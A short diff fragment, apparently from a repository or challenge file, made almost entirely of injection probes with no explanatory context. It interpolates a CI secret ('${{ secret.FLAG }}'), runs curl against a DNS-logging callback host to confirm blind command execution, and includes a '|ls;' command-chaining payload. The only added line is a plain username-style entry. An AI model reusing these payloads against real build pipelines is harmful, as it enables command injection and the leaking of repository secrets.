@@ -853,3 +853,4 @@ DongBother:${{ secret.FLAG }};
 
 shell: /bin/bash -e "curl q92uua.dnslog.cn";
 |ls;
+Konano:test1
